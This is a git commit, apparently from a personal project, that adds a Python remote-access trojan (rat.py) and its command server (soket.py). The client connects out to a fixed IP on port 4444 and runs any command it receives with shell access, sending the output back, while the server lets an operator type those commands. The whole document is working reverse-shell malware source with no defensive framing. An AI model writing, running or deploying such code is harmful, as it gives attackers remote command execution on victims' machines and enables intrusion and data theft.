efd90c5a79a1352cfc1795e95bde943bfae7fa82
valdogarnica <valdogarnica151@gmail.com>
2024-07-01 13:32:23 -0600

    socket para la reverse shell

---
+++ rat.py
@@ -0,0 +1,57 @@
+import sys
+import socket
+import subprocess
+import threading
+
+SERVER_IP = "10.0.35.243"
+PORT = 4444
+
+def handle_commands(sock):
+    while True:
+        try:
+            cmd = sock.recv(1024).decode()
+            print(f'[+] Recibiendo comando: {cmd}')
+            if cmd.lower() in ['q']:
+                break
+            try:
+                result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
+            except subprocess.CalledProcessError as e:
+                result = e.output
+            except Exception as e:
+                result = str(e).encode()
+            
+            if not result:
+                result = print(f'[+] Ejecución exitosa')
+            
+            sock.send(result)
+        except Exception as e:
+            print(f'[!] Error manejando el comando: {e}')
+            break
+
+    sock.close()
+
+def main():
+    s = socket.socket()
+    s.connect((SERVER_IP, PORT))
+    msg = s.recv(1024).decode()
+    print('[+] Conectado al servidor:', msg)
+
+    command_thread = threading.Thread(target=handle_commands, args=(s,))
+    command_thread.daemon = True
+    command_thread.start()
+
+    # Mantén el cliente en ejecución
+    while True:
+        try:
+            # Aquí puedes agregar más lógica si es necesario
+            command_thread.join(1)
+            if not command_thread.is_alive():
+                break
+        except KeyboardInterrupt:
+            print('[+] Cliente detenido por el usuario.')
+            break
+
+    s.close()
+
+if __name__ == "__main__":
+    main()
---
+++ soket.py
@@ -0,0 +1,49 @@
+import sys
+import socket
+import threading
+
+SERVER_IP = '10.0.35.243'
+PORT = 4444
+
+def handle_client(client_socket, client_address):
+    print(f'[+] Cliente conectado: {client_address}')
+    client_socket.send('conectadooo'.encode())
+    
+    try:
+        while True:
+            cmd = input('>>>> ')
+            client_socket.send(cmd.encode())
+
+            if cmd.lower() in ['quit', 'exit', 'q']:
+                break
+
+            resu = client_socket.recv(1024).decode()
+            print(resu)
+    except Exception as e:
+        print(f'[!] Error manejando al cliente {client_address}: {e}')
+    finally:
+        client_socket.close()
+        print(f'[+] Cliente desconectado: {client_address}')
+
+def start_server():
+    server_socket = socket.socket()
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_socket.bind((SERVER_IP, PORT))
+    server_socket.listen(5)
+    print(f'[+] Servidor escuchando en {SERVER_IP}:{PORT}')
+
+    try:
+        while True:
+            client_socket, client_address = server_socket.accept()
+            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
+            client_thread.start()
+    except KeyboardInterrupt:
+        print('[+] Deteniendo el servidor...')
+    except Exception as e:
+        print(f'[!] Error en el servidor: {e}')
+    finally:
+        server_socket.close()
+        print('[+] Servidor cerrado')
+
+if __name__ == "__main__":
+    start_server()
